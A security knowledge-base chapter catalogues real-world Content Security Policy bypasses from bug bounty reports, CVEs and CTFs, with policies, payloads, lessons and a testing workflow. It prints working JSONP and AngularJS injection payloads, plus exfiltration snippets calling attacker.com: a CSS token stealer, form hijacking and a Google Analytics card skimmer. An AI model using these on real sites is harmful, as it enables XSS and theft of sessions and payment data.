# 14 - Real-World CSP Bypass Case Studies

## Overview

This document catalogs real-world CSP bypass discoveries from bug bounty programs, security research publications, CVE disclosures, and CTF challenges. Each case study includes the original CSP configuration, the bypass technique used, the exploitation chain, the impact, and actionable lessons. These examples demonstrate that even security-focused organizations routinely deploy bypassable CSPs, and that novel bypass techniques continue to emerge.

**Sources:**
- https://hackerone.com/reports/2279346
- https://hackerone.com/reports/199779
- https://bounty.github.com/targets/csp.html
- https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/

---

## 1. Google CSP Bypasses

### 1.1 JSONP Endpoints on Google Domains (Systemic Issue)

Google's own services historically whitelisted `*.google.com` and `*.googleapis.com` in their CSP. Multiple researchers independently demonstrated that JSONP endpoints on these broad domains allowed arbitrary JavaScript execution on any site that whitelisted them.

**Vulnerable CSP pattern (found on thousands of sites):**
```
Content-Security-Policy: script-src 'self' *.google.com *.googleapis.com *.gstatic.com
```

**Bypass via Google OAuth JSONP:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)//"></script>
```

**Bypass via Google Custom Search Engine:**
```html
<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
```

**Bypass via Google Maps API:**
```html
<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1)"></script>
```

**Bypass via Google Autocomplete:**
```html
<script src="https://www.google.com/complete/search?client=chrome&q=xss&callback=alert(1)//"></script>
```

**Scope of impact:** Research by the Google security team found that over 2,000 JSONP endpoints across Google domains could serve as CSP bypass vectors. The JSONBee project cataloged many of these endpoints for use in security testing.

**Resolution:** Google transitioned to nonce-based CSP with `strict-dynamic`, eliminating host-based allowlisting. The Google CSP Evaluator tool (https://csp-evaluator.withgoogle.com/) was created partly in response to the prevalence of these bypasses across the web.

**Lesson:** Whitelisting broad domains like `*.google.com` in `script-src` is equivalent to having no CSP for script execution. Any domain hosting JSONP endpoints defeats the policy.

**Source:** https://github.com/zigoo0/JSONBee
**Source:** https://websecblog.com/vulns/google-csp-evaluator/

### 1.2 AngularJS on googleapis.com

Since `ajax.googleapis.com` hosts AngularJS (Google's CDN for JavaScript libraries), any CSP whitelisting this domain is vulnerable to AngularJS template injection:

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.cookie)')()}}</div>
```

**Impact:** Full XSS despite CSP on any site whitelisting `*.googleapis.com`. Google CSP Evaluator specifically flags this domain as bypass-able.

**Source:** https://github.com/google/csp-evaluator/issues/71

### 1.3 CVE-2020-6519: Chrome CSP Bypass (CVSS 6.5)

A zero-day vulnerability in Chromium-based browsers (Chrome versions 73 through 83) allowed bypassing CSP entirely by passing malicious JavaScript in the `src` property of an HTML iframe element.

**Affected sites (host-based CSP, no nonce/hash):** Facebook, Wells Fargo, Gmail, WhatsApp, TikTok, Instagram, Blogger, Quora, Zoom, Roblox, ESPN, Investopedia, Indeed.

**Not affected (nonce/hash-based CSP):** Twitter, GitHub, LinkedIn, PayPal, Yahoo Login, Yandex.

**Impact:** Any site relying solely on host-based CSP allowlists was vulnerable. Sites using nonce or hash-based CSP were protected.

**Lesson:** This CVE demonstrated that nonce/hash-based CSP provides a stronger security guarantee than host-based allowlisting, even against browser implementation bugs.

**Source:** https://medium.com/perimeterx/zero-day-csp-bypass-vulnerability-in-google-chrome-discovered-almost-every-website-in-the-world-ac5e999808b3
**Source:** https://threatprotect.qualys.com/2020/08/11/google-chrome-csp-bypass-vulnerability-cve-2020-6519/

---

## 2. Facebook/Meta CSP Analysis

### 2.1 Google Analytics Exfiltration via Whitelisted Domains

Facebook and many other major sites whitelisted `www.google-analytics.com` in their CSP `img-src` directive. Security researchers discovered that Google Analytics could be weaponized as a data exfiltration channel.

**Attack technique:** By crafting image requests to Google Analytics with stolen data encoded in the event parameters, attackers could exfiltrate sensitive information to their own Google Analytics accounts:

```html
<!-- CSP allows img-src www.google-analytics.com -->
<img src="https://www.google-analytics.com/collect?v=1&tid=UA-ATTACKER-ID&cid=1&t=event&ec=exfil&ea=cookie&el=STOLEN_SESSION_DATA">
```

**Scale:** Research found that out of 210,000 websites using CSP, approximately 17,000 whitelisted `google-analytics.com`. This was actively exploited in Magecart attacks targeting e-commerce sites to steal credit card data.

**Impact:** Threat actors deployed this technique in real credit card skimming campaigns. The attackers injected JavaScript into compromised e-commerce sites that harvested payment card data and exfiltrated it through Google Analytics requests, which passed through CSP unblocked.

**Source:** https://www.bleepingcomputer.com/news/security/hackers-use-google-analytics-to-steal-credit-cards-bypass-csp/
**Source:** https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/

### 2.2 Facebook JSONP Endpoints

Facebook domains contain JSONP endpoints that can be abused when `*.facebook.com` is whitelisted:

```html
<script src="https://www.facebook.com/ajax/haste-response?__a=1&__user=0&jsonp=alert(1)"></script>
```

The JSONBee database catalogs ready-to-use payloads for Facebook.com bypass.

**Source:** https://github.com/zigoo0/JSONBee

---

## 3. Twitter/X CSP Bypass

### 3.1 XSS + CSP Bypass Combination (HackerOne Report #153666)

A researcher found a CSP bypass on `analytics.twitter.com` that, when combined with a reflected XSS on `careers.twitter.com`, enabled full XSS exploitation. Neither vulnerability alone could overcome the CSP protection -- it required chaining the two findings.

**Key insight:** CSP bypass reports often require combining an injection point with a policy weakness. The CSP blocks the injection from executing directly, but the policy weakness provides an alternative execution path.

**Twitter's historical CSP:**
```
Content-Security-Policy: script-src 'self' *.twimg.com *.google.com www.google-analytics.com
```

The Google domain whitelisting created the same JSONP/AngularJS bypass opportunities seen across the industry.

**Source:** https://hackerone.com/reports/153666

---

## 4. GitHub CSP Program and Bypass History

### 4.1 GitHub Bug Bounty for CSP Bypasses

GitHub maintains one of the most public and proactive CSP bug bounty programs. They accept reports for novel CSP bypasses affecting `github.com`, even if they do not include a content injection vulnerability. This means researchers are paid for theoretical bypass techniques.

**GitHub's CSP (representative, simplified):**
```
Content-Security-Policy:
  default-src 'none';
  script-src github.githubassets.com;
  style-src 'unsafe-inline' github.githubassets.com;
  img-src 'self' data: github.githubassets.com *.githubusercontent.com;
  connect-src 'self' github.githubassets.com uploads.github.com;
  form-action 'self' github.com;
  frame-ancestors 'none';
  base-uri 'self';
  object-src 'none'
```

**Strengths of GitHub's CSP:**
- `default-src 'none'` blocks everything not explicitly allowed
- No `unsafe-inline` or `unsafe-eval` in `script-src`
- `base-uri 'self'` prevents base tag injection
- `form-action 'self' github.com` prevents form hijacking
- `object-src 'none'` blocks plugin-based attacks
- `frame-ancestors 'none'` prevents clickjacking

**Key insight:** GitHub moved early to a restrictive CSP and actively invests in bypass research, making their policy one of the strongest in production. Their CSP program page documents what constitutes a valid bypass report.

**Source:** https://bounty.github.com/targets/csp.html

---

## 5. HackerOne Platform CSP Bypasses

### 5.1 CSP Bypass via Click Handler (Report #47472)

**Platform:** HackerOne.com
**Vulnerability:** Despite a strict CSP preventing inline scripts and external scripts, an attacker could inject arbitrary HTML into submitted bug reports. Through event handlers on links and user interaction, the attacker bypassed script restrictions.

**CSP at the time:**
```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'
```

**Lesson:** Even without JavaScript execution, HTML injection enables phishing, form hijacking, and social engineering attacks that CSP cannot prevent.

**Source:** https://hackerone.com/reports/47472

### 5.2 Google Analytics as Exfiltration Channel (Report #199779)

**Platform:** HackerOne.com
**Vulnerability:** HackerOne's CSP allowed `img-src www.google-analytics.com`. A researcher demonstrated that Google Analytics image requests could exfiltrate sensitive data.

**Bypass:**
```html
<img src="https://www.google-analytics.com/collect?v=1&tid=UA-ATTACKER&cid=1&t=event&ec=steal&ea=cookie&el=STOLEN_DATA">
```

**Impact:** Page content and tokens could be exfiltrated to the attacker's Google Analytics account without violating CSP, because the data was encoded in query parameters of an allowed image source.

**Source:** https://hackerone.com/reports/199779

### 5.3 HackerOne.com CSP Weakness (Report #225833)

**Platform:** HackerOne.com
**Vulnerability:** A researcher identified a CSP weakness on `www.hackerone.com` that could potentially be exploited for cross-site scripting.

**Source:** https://hackerone.com/reports/225833

### 5.4 Gratipay CSP Policy Bypass (Report #241192)

**Platform:** Gratipay
**Vulnerability:** CSP implementation gaps allowed XSS execution through specific injection techniques that circumvented the policy.

**Source:** https://hackerone.com/reports/241192

---

## 6. PortSwigger.net CSP Bypass (2024)

### Case Study: Google reCAPTCHA Domain Serves AngularJS

**Researcher:** Johan Carlsson
**Date:** February 2024
**Report:** HackerOne #2279346
**Bounty:** $1,000 + $500 bonus

**Original CSP (simplified):**
```
Content-Security-Policy: script-src 'self' *.google.com *.gstatic.com www.recaptcha.net
```

**Vulnerability:** PortSwigger whitelisted `www.gstatic.com` for the reCAPTCHA widget. However, `www.gstatic.com` also hosts AngularJS. The researcher loaded AngularJS from the whitelisted domain and used Angular template injection to execute arbitrary JavaScript.

**Bypass payload:**
```html
<script src="https://www.gstatic.com/external_hosted/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.cookie)')()}}</div>
```

**Additional finding:** The CSP lacked a `form-action` directive, enabling credential theft:
```html
<form action="https://attacker.com/steal" method="POST">
  <input type="hidden" name="session">
</form>
```

**Resolution:** PortSwigger updated their CSP to use nonce-based enforcement and added `form-action 'self'`.

**Lesson:** Third-party service integration (reCAPTCHA, analytics, ads) frequently requires whitelisting domains that also serve exploitable resources like AngularJS.

**Source:** https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
**Source:** https://hackerone.com/reports/2279346

---

## 7. DOM Clobbering Exploit Chain in the Wild (2024)

### "Go Go XSS Gadgets" - Brett Buerhaus

**Researcher:** Brett Buerhaus
**Date:** February 2024
**Impact:** Full XSS via DOM clobbering + postMessage + CSP bypass chain

**The attack chain (5 steps):**

**Step 1 -- postMessage Origin Bypass:** The target application's `postMessage` handler validated origins using a regex matching `*.domain1.com` or `*.domain2.com`. The attacker found a separate XSS on `domain2` to send trusted postMessages.

**Step 2 -- DOM Clobbering:** The postMessage handler processed data read from the DOM. The attacker used HTML injection to clobber a global variable:
```html
<a id="mGlobals"></a>
<a id="mGlobals" name="nuanceLaunchJS" href="https://attacker.com/evil.js"></a>
```

**Step 3 -- CSP Bypass via strict-dynamic:** A trusted script with a valid nonce read `mGlobals.nuanceLaunchJS` (now pointing to the clobbered anchor's `href` attribute) and used it as a `script.src` value. Because `strict-dynamic` was active, the dynamically created script inherited trust and executed.

**Step 4 -- Script Execution:** The attacker's `evil.js` loaded from `attacker.com`, executing with full privileges in the target page's context.

**Step 5 -- Data Exfiltration:** With JavaScript execution achieved, the attacker could steal cookies, tokens, and perform actions on behalf of the user.

**Key lesson:** Even with nonce + strict-dynamic CSP, DOM clobbering can redirect script loading to attacker-controlled sources when trusted code reads URLs from DOM elements without validation.

**Source:** https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/

---

## 8. Piwik PRO AngularJS Hidden CSP Bypass

### Case Study: Hidden AngularJS Dependency in Analytics

**Researcher:** PortSwigger Research
**Publication:** "Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO"

**Vulnerability:** Piwik PRO analytics loaded AngularJS as an internal dependency. Any website using Piwik PRO had to whitelist the Piwik PRO domain in their CSP `script-src`. Since AngularJS was served from that same domain, every site using Piwik PRO analytics was vulnerable to Angular template injection.

**Bypass:**
```html
<script src="https://container.piwikpro.com/angular/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
```

**Impact:** All websites using Piwik PRO analytics with CSP whitelisting of the Piwik PRO domain were vulnerable to XSS through Angular template injection. The AngularJS dependency was not documented, so site administrators had no way to know their CSP was compromised.

**Lesson:** When whitelisting third-party domains for analytics, ad platforms, or other services, audit what OTHER resources those domains serve. A single AngularJS file on a whitelisted domain defeats the CSP.

**Source:** https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro

---

## 9. Firebase/Cloud Platform Wildcard Bypass

### Case Study: iframe CSP Bypass via *.firebaseapp.com

**Vulnerability:** A target application's CSP included `frame-src *.firebaseapp.com`. Since any user can create a Firebase project and receive a `<project-name>.firebaseapp.com` subdomain, the attacker:

1. Created a Firebase project at `attacker-csp-bypass.firebaseapp.com`
2. Deployed a malicious HTML page to the Firebase hosting
3. Injected an iframe loading their Firebase-hosted page

**Bypass:**
```html
<!-- CSP: frame-src *.firebaseapp.com -->
<iframe src="https://attacker-csp-bypass.firebaseapp.com/steal.html"></iframe>
```

**Escalation (from the attacker's Firebase page):**
```javascript
// On attacker-csp-bypass.firebaseapp.com/steal.html
window.top.location = "https://attacker.com/phish?ref=" + document.referrer;
```

**Impact:** Open redirect leading to phishing attacks. The same pattern applies to other shared hosting platforms:

| Platform | Wildcard Domain | Attacker Can Register |
|----------|----------------|----------------------|
| Firebase | `*.firebaseapp.com` | Yes (free) |
| Heroku | `*.herokuapp.com` | Yes (free) |
| Azure | `*.azurewebsites.net` | Yes (free tier) |
| AWS | `*.s3.amazonaws.com` | Yes (free tier) |
| CloudFront | `*.cloudfront.net` | Yes (any AWS account) |
| Netlify | `*.netlify.app` | Yes (free) |
| Vercel | `*.vercel.app` | Yes (free) |
| GitHub Pages | `*.github.io` | Yes (free) |

**Lesson:** Never whitelist wildcard subdomains of shared hosting/cloud platforms in CSP. An attacker can register their own subdomain on the same platform and serve malicious content.

**Source:** https://jmrcsnchz.medium.com/playing-with-iframes-bypassing-content-security-policy-987c2f0b8e8a

---

## 10. WordPress CSP Bypass via JSONP API

### Case Study: WordPress REST API as CSP Bypass Vector

**Scenario:** Main application at `app.example.com` has strict CSP. WordPress blog at `blog.example.com` shares the same CSP scope via wildcard `*.example.com`.

**Bypass chain:**
1. Find HTML injection on `app.example.com`
2. WordPress REST API at `blog.example.com` supports JSONP via the `_jsonp` parameter
3. CSP allows `*.example.com`, so the WordPress endpoint is whitelisted

**Payload:**
```html
<!-- CSP: script-src *.example.com -->
<script src="https://blog.example.com/wp-json/wp/v2/users?_jsonp=alert(document.cookie)"></script>
```

**Impact:** The WordPress REST API's built-in JSONP support provides a universal CSP bypass when WordPress is hosted on any subdomain that is whitelisted in the target's CSP. This is a common pattern in enterprise deployments where a corporate blog (WordPress) shares a domain with the main application.

**Lesson:** WordPress installations on subdomains of the main application create inherent CSP bypass risks through the REST API JSONP functionality.

**Source:** https://blog.intigriti.com/2022/06/01/bug-bytes-172-pre-hijacking-accounts-csp-bypass-using-wordpress-unusual-ssrf-phishing-chain/

---

## 11. CVE-2024-47068: Rollup Bundler DOM Clobbering Gadget

**CVE:** CVE-2024-47068
**Affected:** Rollup bundler (output bundles)
**Severity:** Medium

**Vulnerability:** Rollup-bundled scripts contained auto-generated module system code that referenced `document.currentScript` to determine the base URL for loading additional chunks. This reference was DOM-clobberable:

```html
<!-- Attacker injects HTML to clobber document.currentScript -->
<img name="currentScript" src="https://attacker.com/evil.js">
```

Rollup's generated code would read the clobbered value and use it as a base URL for loading additional script chunks, redirecting those loads to the attacker's server.

**Impact:** Any web application using Rollup-bundled JavaScript with HTML injection capabilities was vulnerable to XSS via DOM clobbering.

**Fix:** Rollup patched the generated code to avoid DOM-clobberable references, using safer alternatives to determine the script base path.

**Source:** https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm

---

## 12. Webpack DOM Clobbering Gadget

**Advisory:** GHSA-4vvj-4cpr-p986
**Affected:** Webpack `AutoPublicPathRuntimeModule`

**Vulnerability:** Webpack's auto public path detection generated code that read from `document.currentScript` or `document.querySelector('script[src]')` to determine the base URL for loading chunks. This was clobberable:

```html
<script id="currentScript" src="https://attacker.com/"></script>
```

**Impact:** Webpack-bundled applications could have their dynamic import paths redirected to attacker-controlled servers, loading malicious JavaScript in the context of the vulnerable page. This bypassed CSP because Webpack's chunk loader was itself a trusted script (with a valid nonce or loaded from an allowed source), and `strict-dynamic` propagated trust to the loaded chunks.

**Source:** https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

---

## 13. Intigriti CTF CSP Bypass (July 2024)

### The "Memo" Challenge

**Challenge:** A memo application with a strict nonce-based CSP using `strict-dynamic`
**Techniques required:** DOM clobbering + base tag injection + relative path abuse

**CSP:**
```
Content-Security-Policy: script-src 'nonce-RANDOM' 'strict-dynamic'; base-uri 'none'; object-src 'none'
```

**Solution approach:** The challenge required recognizing that:
1. Although `base-uri 'none'` was set, a DOM clobbering vector could influence relative path resolution
2. A trusted nonced script loaded additional resources via relative paths
3. By clobbering specific DOM properties, the relative path resolution could be redirected to an attacker-controlled origin
4. `strict-dynamic` ensured the loaded resources inherited trust from the initial nonced script

**Key takeaway:** Even with `base-uri 'none'`, `object-src 'none'`, and nonce + `strict-dynamic`, application-level code containing gadgets (DOM reads that influence script loading) can be exploited.

**Source:** https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/
**Source:** https://realansgar.dev/writeups/intigriti-xss-0724/

---

## 14. CSS-Only Data Exfiltration: OAuth Token Theft

**Researcher:** Voorivex Team
**Technique:** CSS attribute selector-based exfiltration without JavaScript

**Scenario:** A strict CSP prevented all JavaScript execution, but `style-src 'unsafe-inline'` was set. The researcher used CSS attribute selectors to exfiltrate an OAuth access token character by character.

**Payload (iterative approach):**
```css
/* Round 1: Detect first characters */
input[value^="eyJ"] { background: url("https://attacker.com/?t=eyJ"); }
input[value^="eyJh"] { background: url("https://attacker.com/?t=eyJh"); }
input[value^="eyJhb"] { background: url("https://attacker.com/?t=eyJhb"); }
/* ... continue for all possible next characters ... */

/* Round 2: Build on confirmed prefix from server logs */
input[value^="eyJhbG"] { background: url("https://attacker.com/?t=eyJhbG"); }
input[value^="eyJhbGc"] { background: url("https://attacker.com/?t=eyJhbGc"); }
/* ... and so on ... */
```

**Impact:** Complete OAuth access tokens stolen without any JavaScript execution. The attacker's server logs revealed the token one character at a time.

**Lesson:** `style-src 'unsafe-inline'` enables scriptless data exfiltration. CSP administrators should treat inline style allowances as a data leakage risk, not just a cosmetic concern.

**Source:** https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token

---

## 15. HackMD XSS and CSP Bypass

**Platform:** HackMD (collaborative Markdown editor)
**Researcher:** k1tten

**Vulnerability:** HackMD allowed rich Markdown rendering that included HTML. The CSP was designed to prevent script execution from user content, but the researcher found a bypass chain:

1. HTML injection via Markdown rendering (intended feature, but insufficient sanitization)
2. CSP bypass using a whitelisted domain that served user-controlled content
3. Full XSS execution in the context of other users' sessions

**Impact:** Stored XSS affecting all users who viewed the malicious document.

**Source:** https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md

---

## 16. Magecart E-Commerce CSP Bypass Campaigns

### Large-Scale CSP Bypass in Payment Skimming

**Context:** Magecart threat groups (active 2019-2024) specifically targeted e-commerce sites that deployed CSP as a defense against JavaScript-based payment card skimmers.

**Techniques used in the wild:**
1. **Google Analytics exfiltration:** Sites whitelisting `www.google-analytics.com` in `img-src` allowed attackers to encode stolen credit card data in GA tracking pixel parameters
2. **CDN compromise:** Attackers compromised JavaScript files hosted on CDNs that were whitelisted in target CSPs
3. **Subdomain takeover:** Expired or unclaimed subdomains that were still whitelisted in CSP were taken over to host skimmer code

**Example attack (Google Analytics exfil):**
```javascript
// Injected skimmer (runs because it was injected into a trusted script file on CDN)
var cardData = document.querySelector('input[name="cc_number"]').value;
var img = new Image();
img.src = 'https://www.google-analytics.com/collect?v=1&tid=UA-ATTACKER-1&cid=555&t=event&ec=payment&ea=card&el=' + encodeURIComponent(cardData);
```

**Scale:** Kaspersky researchers identified dozens of e-commerce sites compromised using CSP bypass techniques for payment data theft.

**Source:** https://www.bleepingcomputer.com/news/security/hackers-use-google-analytics-to-steal-credit-cards-bypass-csp/

---

## 17. CSP Bypass Methodology: Step-by-Step Analysis Workflow

### Phase 1: Reconnaissance

```bash
# Extract CSP header
curl -sI https://target.com | grep -i content-security-policy

# Check for Report-Only (not enforced -- immediate win)
curl -sI https://target.com | grep -i "content-security-policy-report-only"

# Check for meta tag CSP (if no header found)
curl -s https://target.com | grep -i "content-security-policy"

# Check for multiple CSP headers (intersection behavior)
curl -sI https://target.com | grep -ci "content-security-policy"

# Run through Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/
```

### Phase 2: Policy Decomposition

1. Parse all directives and their source expressions
2. Identify the `default-src` fallback value
3. Map which directives are explicitly set vs. falling back to `default-src`
4. Identify **missing** critical directives: `object-src`, `base-uri`, `form-action`, `frame-ancestors`
5. Determine CSP enforcement level: host-based vs. nonce/hash vs. strict-dynamic

### Phase 3: Quick-Win Checks

| Check | If True | Bypass |
|-------|---------|--------|
| Only Report-Only header? | CSP not enforced | Direct XSS, no bypass needed |
| `unsafe-inline` in `script-src`? | No XSS protection | Any inline script/handler |
| `unsafe-eval` in `script-src`? | eval() allowed | Inject into eval sink |
| `data:` in `script-src`? | Data URI scripts allowed | `<script src="data:...">` |
| `blob:` in `script-src`? | Blob scripts allowed | Create and load blob script |
| Missing `form-action`? | Form hijacking possible | Scriptless credential theft |
| Missing `base-uri`? | Base tag injection possible | Redirect relative URLs |
| Missing `object-src`? | Plugin-based XSS | `<object data="data:text/html,...">` |

### Phase 4: Whitelisted Domain Analysis

```bash
# For each domain whitelisted in script-src:

# 1. Check JSONBee for known JSONP endpoints
# https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
grep "whitelisted-domain.com" jsonp.txt

# 2. Check for AngularJS hosting
curl -sI "https://whitelisted-domain.com/angular.js" | head -1
curl -sI "https://whitelisted-domain.com/angularjs/angular.min.js" | head -1

# 3. Fuzz for JSONP endpoints
for param in callback cb jsonp jsonpcallback jcb call func handler; do
  curl -s "https://whitelisted-domain.com/api?${param}=CSP_TEST" | head -5
done

# 4. Check for open redirects
curl -sI "https://whitelisted-domain.com/redirect?url=https://attacker.com" | grep -i location

# 5. Check if attacker can host content on the domain
# (shared hosting, cloud platforms, CDN user content)

# 6. Use CSPBypass.com for automated analysis
# https://github.com/renniepak/CSPBypass
```

### Phase 5: Gadget Hunting (for Nonce/strict-dynamic CSPs)

```bash
# Identify JavaScript libraries loaded by the page
curl -s https://target.com | grep -oP 'src="[^"]*\.js[^"]*"' | sort -u

# Check loaded libraries for known gadgets:
# - AngularJS (template injection)
# - RequireJS (data-main attribute)
# - Polymer (data binding)
# - jQuery < 3.0 (.html() method)
# - Knockout.js (data-bind)

# Analyze trusted (nonced) scripts for DOM reads:
# - document.getElementById()
# - document.querySelector()
# - window.* global access
# - Dynamic script creation (createElement('script'))
# - innerHTML/outerHTML assignments
# - eval() / Function() with variable input
```

### Phase 6: Exploit Construction and Verification

1. Match the identified weakness to a bypass technique from knowledge-base/13
2. Build a payload specific to the target's CSP configuration
3. Test in browser with DevTools Console and Network tabs open
4. If script execution is fully blocked, attempt exfiltration-only bypasses:
   - DNS prefetch: `<link rel="dns-prefetch" href="//data.attacker.com">`
   - CSS exfiltration: `<style>input[value^="x"]{background:url(...)}</style>`
   - Form hijacking: `<form action="https://attacker.com/steal">`
   - Meta refresh: `<meta http-equiv="refresh" content="0;url=...">`
5. Document the full chain: injection point -> CSP weakness -> bypass technique -> impact

---

## 18. Common CSP Patterns in the Wild and Their Bypasses

### Pattern 1: Google Services Integration (Very Common)
```
script-src 'self' *.google.com *.gstatic.com *.googleapis.com
```
**Bypass:** JSONP on Google domains, AngularJS on googleapis.com/gstatic.com
**Prevalence:** Found on tens of thousands of sites

### Pattern 2: CDN-Heavy Allowlist (Common)
```
script-src 'self' cdnjs.cloudflare.com cdn.jsdelivr.net unpkg.com
```
**Bypass:** AngularJS or RequireJS loaded from any of these CDNs
**Note:** These CDNs serve ANY npm package, including exploitable libraries

### Pattern 3: Cloud Platform Wildcards (Common)
```
script-src 'self' *.amazonaws.com *.cloudfront.net; frame-src *.firebaseapp.com
```
**Bypass:** Attacker creates own S3 bucket / CloudFront distribution / Firebase project on the same platform

### Pattern 4: Self-Only with JSONP on Same Origin (Moderate)
```
script-src 'self'
```
**Bypass:** Find JSONP, file upload, or user content endpoint on same origin

### Pattern 5: Nonce Without base-uri (Moderate)
```
script-src 'nonce-random123' 'strict-dynamic'
```
**Bypass:** Base tag injection to redirect relative script loads (if `base-uri` not set)

### Pattern 6: Nonce + strict-dynamic + Complete Directives (Hardest)
```
script-src 'nonce-random123' 'strict-dynamic'; base-uri 'none'; object-src 'none'; form-action 'self'
```
**Bypass:** DOM clobbering + script gadget in trusted code (application-specific), or browser CVE

---

## 19. CSP Bypass Testing Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Google CSP Evaluator | Analyze CSP for weaknesses and known bypass-able domains | https://csp-evaluator.withgoogle.com/ |
| CSPBypass.com | Map CSP configuration to known bypass gadgets | https://github.com/renniepak/CSPBypass |
| JSONBee | Curated JSONP endpoint payloads for CSP bypass | https://github.com/zigoo0/JSONBee |
| JSONPeek + CSP B Gone | Automated JSONP endpoint discovery on whitelisted domains | https://www.blackhillsinfosec.com/jsonpeek-and-csp-b-gone/ |
| Burp Suite CSP Auditor | Passive CSP analysis during proxy-based testing | https://portswigger.net/bappstore |
| Nuclei CSP Templates | Automated CSP bypass detection at scale | https://projectdiscovery.io/ |
| CentralCSP Scanner | Online CSP scanning and analysis | https://centralcsp.com/features/scanner |
| DOM Clobbering Collection | Known DOM clobbering gadgets in popular libraries | https://github.com/nicol-lo/dom-clobbering-collection |
| retire.js | Identify vulnerable/outdated JavaScript libraries | https://retirejs.github.io/retire.js/ |
| Browser DevTools | Real-time CSP violation monitoring and testing | Built into Chrome/Firefox |

### Quick CSP Analysis One-Liner

```bash
# Fetch CSP, extract whitelisted script-src domains, check each for JSONP
curl -sI https://target.com | grep -i "content-security-policy" | \
  tr ';' '\n' | grep script-src | grep -oP 'https?://[a-zA-Z0-9.*-]+' | \
  sort -u | while read domain; do
    echo "=== Checking: $domain ==="
    curl -s "${domain}/?callback=CSP_BYPASS_TEST" 2>/dev/null | head -3
  done
```

---

## References

- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- JSONBee Repository: https://github.com/zigoo0/JSONBee
- GitHub CSP Bug Bounty: https://bounty.github.com/targets/csp.html
- PortSwigger CSP Bypass (Johan Carlsson): https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
- HackerOne Report #2279346 (PortSwigger CSP Bypass): https://hackerone.com/reports/2279346
- HackerOne Report #2387458 (PortSwigger CSP Bypass): https://hackerone.com/reports/2387458
- HackerOne Report #47472 (CSP Click Handler): https://hackerone.com/reports/47472
- HackerOne Report #199779 (Google Analytics Exfil): https://hackerone.com/reports/199779
- HackerOne Report #225833 (HackerOne CSP): https://hackerone.com/reports/225833
- HackerOne Report #241192 (Gratipay CSP): https://hackerone.com/reports/241192
- HackerOne Report #153666 (Twitter CSP): https://hackerone.com/reports/153666
- Go Go XSS Gadgets (DOM Clobbering in Wild): https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
- PortSwigger DOM Clobbering Research: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- PortSwigger Nonce Bypass Research: https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
- PortSwigger Piwik PRO Bypass: https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro
- PortSwigger Form Hijacking: https://portswigger.net/research/using-form-hijacking-to-bypass-csp
- CVE-2020-6519 Chrome CSP Bypass: https://medium.com/perimeterx/zero-day-csp-bypass-vulnerability-in-google-chrome-discovered-almost-every-website-in-the-world-ac5e999808b3
- CVE-2020-6519 Qualys Analysis: https://threatprotect.qualys.com/2020/08/11/google-chrome-csp-bypass-vulnerability-cve-2020-6519/
- CVE-2024-47068 Rollup DOM Clobbering: https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm
- Webpack DOM Clobbering Advisory: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
- CSS OAuth Token Exfiltration: https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token
- Google Analytics Credit Card Theft: https://www.bleepingcomputer.com/news/security/hackers-use-google-analytics-to-steal-credit-cards-bypass-csp/
- Detectify Google Analytics CSP Bypass: https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/
- Firebase iframe CSP Bypass: https://jmrcsnchz.medium.com/playing-with-iframes-bypassing-content-security-policy-987c2f0b8e8a
- WordPress REST API CSP Bypass: https://blog.intigriti.com/2022/06/01/bug-bytes-172-pre-hijacking-accounts-csp-bypass-using-wordpress-unusual-ssrf-phishing-chain/
- HackMD XSS + CSP Bypass: https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md
- Intigriti July 2024 CTF Challenge: https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/
- Intigriti CTF DOMPurify Bypass: https://realansgar.dev/writeups/intigriti-xss-0724/
- Script Gadgets Paper (ACM CCS 2017): https://acmccs.github.io/papers/p1709-lekiesA.pdf
- HackTricks CSP Bypass: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- CSP Exfiltration Challenge: https://vicevirus.github.io/posts/csp-challenge-exfil/
- Cobalt CSP Bypasses: https://www.cobalt.io/blog/csp-and-bypasses
- Google CSP Evaluator Issues: https://github.com/google/csp-evaluator/issues/71
- Truesec Code-Reuse Attacks: https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks

---
## [2024-2026 Research Update]

